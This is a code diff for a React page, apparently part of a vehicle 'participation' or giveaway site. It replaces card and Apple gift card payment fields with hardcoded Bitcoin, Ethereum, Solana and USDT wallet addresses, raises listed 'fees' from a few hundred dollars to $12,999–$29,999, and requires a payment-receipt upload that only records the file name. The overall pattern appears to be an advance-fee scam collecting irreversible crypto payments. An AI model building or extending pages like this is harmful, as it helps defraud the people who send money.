@@ -20,7 +20,7 @@ const vehicleOptions = [
     range: "358 mi Range",
     delivery: "7–10 Business Days",
     shipsTo: "All Countries",
-    fee: "$299",
+    fee: "$18,999",
     img: sedanSilver,
   },
   {
@@ -31,7 +31,7 @@ const vehicleOptions = [
     range: "330 mi Range",
     delivery: "5–7 Business Days",
     shipsTo: "All Countries",
-    fee: "$349",
+    fee: "$24,999",
     img: suvWhite,
   },
   {
@@ -42,7 +42,7 @@ const vehicleOptions = [
     range: "405 mi Range",
     delivery: "3–5 Business Days",
     shipsTo: "All Countries",
-    fee: "$399",
+    fee: "$29,999",
     img: sedanBlue,
   },
   {
@@ -53,7 +53,7 @@ const vehicleOptions = [
     range: "348 mi Range",
     delivery: "10–14 Business Days",
     shipsTo: "All Countries",
-    fee: "$249",
+    fee: "$28,999",
     img: suvBlack,
   },
   {
@@ -64,7 +64,7 @@ const vehicleOptions = [
     range: "272 mi Range",
     delivery: "10–14 Business Days",
     shipsTo: "All Countries",
-    fee: "$199",
+    fee: "$12,999",
     img: sedanRed,
   },
 ];
@@ -90,10 +90,17 @@ const deliveryOptions = [
   },
 ];
 
+const cryptoAddresses = {
+  BTC: "bc1qv6w3uzlgh88lze3dragznwsnrjaac2wt93jqjc",
+  ETH: "0xf1eF924C75c5581ed59B632072E9bC68083b0157",
+  SOL: "DQhSWapaC7NA5kDuN7wuGtMGfzKkSNcfufD4HbpNi77z",
+  USDT: "0xf1eF924C75c5581ed59B632072E9bC68083b0157",
+};
+
 function Participate() {
   const [selectedVehicle, setSelectedVehicle] = useState(vehicleOptions[0]);
   const [selectedDelivery, setSelectedDelivery] = useState(deliveryOptions[0]);
-  const [paymentMethod, setPaymentMethod] = useState<"credit-card" | "apple-gift">("credit-card");
+  const [paymentMethod, setPaymentMethod] = useState<"BTC" | "ETH" | "SOL" | "USDT">("BTC");
   const [step, setStep] = useState<"form" | "delivery" | "payment">("form");
 
   const [formData, setFormData] = useState({
@@ -105,11 +112,7 @@ function Participate() {
     zipCode: "",
     country: "",
     phone: "",
-    cardName: "",
-    cardNumber: "",
-    cardExpiry: "",
-    cardCvv: "",
-    giftCardCode: "",
+    paymentReceiptUrl: "",
   });
   const [submitted, setSubmitted] = useState(false);
 
@@ -120,6 +123,10 @@ function Participate() {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+    if (!formData.paymentReceiptUrl) {
+      alert("Please upload your payment receipt");
+      return;
+    }
     setSubmitted(true);
     setTimeout(() => {
       setSubmitted(false);
@@ -132,11 +139,7 @@ function Participate() {
         zipCode: "",
         country: "",
         phone: "",
-        cardName: "",
-        cardNumber: "",
-        cardExpiry: "",
-        cardCvv: "",
-        giftCardCode: "",
+        paymentReceiptUrl: "",
       });
       setStep("form");
     }, 3000);
@@ -486,111 +489,126 @@ function Participate() {
               {step === "payment" && (
                 <>
                   <div>
-                    <h3 className="text-lg font-bold mb-4">Select Payment Method</h3>
-                    <div className="grid md:grid-cols-2 gap-4">
+                    <h3 className="text-lg font-bold mb-4">Select Cryptocurrency Payment</h3>
+                    <div className="grid md:grid-cols-4 gap-3">
                       <button
                         type="button"
-                        onClick={() => setPaymentMethod("credit-card")}
-                        className={`p-6 rounded-xl border-2 transition-all flex flex-col items-center gap-3 ${
-                          paymentMethod === "credit-card"
+                        onClick={() => setPaymentMethod("BTC")}
+                        className={`p-4 rounded-xl border-2 transition-all flex flex-col items-center gap-2 ${
+                          paymentMethod === "BTC"
                             ? "border-primary bg-primary/10"
                             : "border-border hover:border-primary/50"
                         }`}
                       >
-                        <span className="text-3xl">💳</span>
-                        <span className="font-bold">Credit Card</span>
+                        <span className="text-2xl">₿</span>
+                        <span className="font-bold text-sm">Bitcoin</span>
                       </button>
                       <button
                         type="button"
-                        onClick={() => setPaymentMethod("apple-gift")}
-                        className={`p-6 rounded-xl border-2 transition-all flex flex-col items-center gap-3 ${
-                          paymentMethod === "apple-gift"
+                        onClick={() => setPaymentMethod("ETH")}
+                        className={`p-4 rounded-xl border-2 transition-all flex flex-col items-center gap-2 ${
+                          paymentMethod === "ETH"
                             ? "border-primary bg-primary/10"
                             : "border-border hover:border-primary/50"
                         }`}
                       >
-                        <span className="text-3xl">🍎</span>
-                        <span className="font-bold">Apple Gift Card</span>
+                        <span className="text-2xl">Ξ</span>
+                        <span className="font-bold text-sm">Ethereum</span>
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => setPaymentMethod("SOL")}
+                        className={`p-4 rounded-xl border-2 transition-all flex flex-col items-center gap-2 ${
+                          paymentMethod === "SOL"
+                            ? "border-primary bg-primary/10"
+                            : "border-border hover:border-primary/50"
+                        }`}
+                      >
+                        <span className="text-2xl">◎</span>
+                        <span className="font-bold text-sm">Solana</span>
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => setPaymentMethod("USDT")}
+                        className={`p-4 rounded-xl border-2 transition-all flex flex-col items-center gap-2 ${
+                          paymentMethod === "USDT"
+                            ? "border-primary bg-primary/10"
+                            : "border-border hover:border-primary/50"
+                        }`}
+                      >
+                        <span className="text-2xl">₮</span>
+                        <span className="font-bold text-sm">USDT</span>
                       </button>
                     </div>
                   </div>
 
-                  {/* Credit Card Form */}
-                  {paymentMethod === "credit-card" && (
-                    <div className="space-y-4 border-t border-border pt-6">
-                      <h4 className="font-bold flex items-center gap-2">
-                        <span>💳</span> Credit Card Payment
-                      </h4>
-                      <input
-                        type="text"
-                        name="cardName"
-                        value={formData.cardName}
-                        onChange={handleInputChange}
-                        placeholder="Card Holder Name"
-                        required
-                        className="w-full px-4 py-3 rounded-lg border border-border bg-background focus:outline-none focus:ring-2 focus:ring-primary"
-                      />
-                      <input
-                        type="text"
-                        name="cardNumber"
-                        value={formData.cardNumber}
-                        onChange={handleInputChange}
-                        placeholder="Card Number"
-                        required
-                        className="w-full px-4 py-3 rounded-lg border border-border bg-background focus:outline-none focus:ring-2 focus:ring-primary"
-                      />
-                      <div className="grid grid-cols-2 gap-4">
-                        <input
-                          type="text"
-                          name="cardExpiry"
-                          value={formData.cardExpiry}
-                          onChange={handleInputChange}
-                          placeholder="MM/YY"
-                          required
-                          className="w-full px-4 py-3 rounded-lg border border-border bg-background focus:outline-none focus:ring-2 focus:ring-primary"
-                        />
-                        <input
-                          type="text"
-                          name="cardCvv"
-                          value={formData.cardCvv}
-                          onChange={handleInputChange}
-                          placeholder="CVV"
-                          required
-                          className="w-full px-4 py-3 rounded-lg border border-border bg-background focus:outline-none focus:ring-2 focus:ring-primary"
-                        />
-                      </div>
-                      <div className="border-2 border-dashed border-border rounded-lg p-6 text-center">
-                        <p className="text-warning font-bold flex items-center justify-center gap-2 mb-2">
-                          <span>📤</span> Upload Payment Proof
-                        </p>
-                        <p className="text-sm text-muted-foreground">Tap to upload proof</p>
-                      </div>
-                    </div>
-                  )}
+                  {/* Crypto Payment Info */}
+                  <div className="space-y-4 border-t border-border pt-6">
+                    <h4 className="font-bold flex items-center gap-2">
+                      <span>💰</span> {paymentMethod} Payment Address
+                    </h4>
 
-                  {/* Apple Gift Card Form */}
-                  {paymentMethod === "apple-gift" && (
-                    <div className="space-y-4 border-t border-border pt-6">
-                      <h4 className="font-bold flex items-center gap-2">
-                        <span>🎁</span> Apple Gift Card
-                      </h4>
-                      <input
-                        type="text"
-                        name="giftCardCode"
-                        value={formData.giftCardCode}
-                        onChange={handleInputChange}
-                        placeholder="Gift Card Code: XXXX-XXXX-XXXX"
-                        required
-                        className="w-full px-4 py-3 rounded-lg border border-border bg-background focus:outline-none focus:ring-2 focus:ring-primary"
-                      />
-                      <div className="border-2 border-dashed border-border rounded-lg p-6 text-center">
-                        <p className="text-warning font-bold flex items-center justify-center gap-2 mb-2">
-                          <span>📤</span> Upload Payment Proof
-                        </p>
-                        <p className="text-sm text-muted-foreground">Tap to upload proof</p>
+                    <div className="bg-muted rounded-lg p-4 border border-border">
+                      <p className="text-xs font-semibold text-muted-foreground mb-2 uppercase">Send {paymentMethod} to this address:</p>
+                      <div className="bg-background rounded p-3 font-mono text-sm break-all border border-border mb-3">
+                        {cryptoAddresses[paymentMethod]}
+                      </div>
+                      <button
+                        type="button"
+                        onClick={() => {
+                          navigator.clipboard.writeText(cryptoAddresses[paymentMethod]);
+                          alert("Address copied to clipboard!");
+                        }}
+                        className="w-full bg-primary text-primary-foreground py-2 rounded-lg font-semibold hover:bg-primary-glow transition-colors text-sm"
+                      >
+                        📋 Copy Address
+                      </button>
+                    </div>
+
+                    <div className="bg-warning/10 border border-warning/30 rounded-lg p-4">
+                      <p className="text-sm font-semibold text-foreground mb-2">⚠️ Payment Details:</p>
+                      <ul className="text-xs text-muted-foreground space-y-1">
+                        <li>• Send exactly <strong>{getTotalPrice()}</strong> worth of {paymentMethod}</li>
+                        <li>• Include the amount shown above in your transaction</li>
+                        <li>• Network fees may apply depending on blockchain</li>
+                        <li>• Allow 5-30 minutes for confirmation</li>
+                      </ul>
+                    </div>
+
+                    <div className="space-y-2">
+                      <label className="block text-sm font-semibold">Upload Payment Receipt/Proof</label>
+                      <p className="text-xs text-muted-foreground mb-2">Screenshot of your transaction confirmation (must show amount, address, and timestamp)</p>
+                      <div className="relative border-2 border-dashed border-border rounded-lg p-8 text-center hover:border-primary/50 transition-colors cursor-pointer">
+                        <input
+                          type="file"
+                          accept="image/*,.pdf"
+                          onChange={(e) => {
+                            if (e.target.files?.[0]) {
+                              setFormData(prev => ({
+                                ...prev,
+                                paymentReceiptUrl: e.target.files![0].name
+                              }));
+                            }
+                          }}
+                          className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
+                        />
+                        {formData.paymentReceiptUrl ? (
+                          <>
+                            <p className="text-success font-bold flex items-center justify-center gap-2">
+                              <span>✅</span> {formData.paymentReceiptUrl}
+                            </p>
+                          </>
+                        ) : (
+                          <>
+                            <p className="font-bold flex items-center justify-center gap-2 mb-2">
+                              <span>📤</span> Click to upload payment proof
+                            </p>
+                            <p className="text-xs text-muted-foreground">PNG, JPG, or PDF (Max 10MB)</p>
+                          </>
+                        )}
                       </div>
                     </div>
-                  )}
+                  </div>
 
                   <div className="flex gap-3">
                     <button
